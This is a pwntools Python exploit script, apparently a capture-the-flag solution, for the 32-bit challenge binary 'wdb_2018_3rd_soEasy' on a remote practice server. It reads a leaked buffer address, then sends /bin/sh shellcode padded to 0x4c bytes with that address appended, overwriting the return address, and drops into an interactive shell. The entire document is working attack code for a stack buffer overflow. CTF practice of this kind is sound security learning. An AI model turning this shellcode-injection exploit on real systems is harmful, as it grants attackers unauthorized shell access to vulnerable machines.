from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('wdb_2018_3rd_soEasy')
io = remote('node4.buuoj.cn', 28381)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc-2.23.so')
elf = ELF('wdb_2018_3rd_soEasy')

shellcode = asm(shellcraft.sh())
io.recvuntil('Hei,give you a gift->')
buf = int(io.recvline()[:-1], 16)
payload = shellcode.ljust(0x4c) + p32(buf)
io.sendlineafter('what do you want to do?\n', payload)
io.interactive()
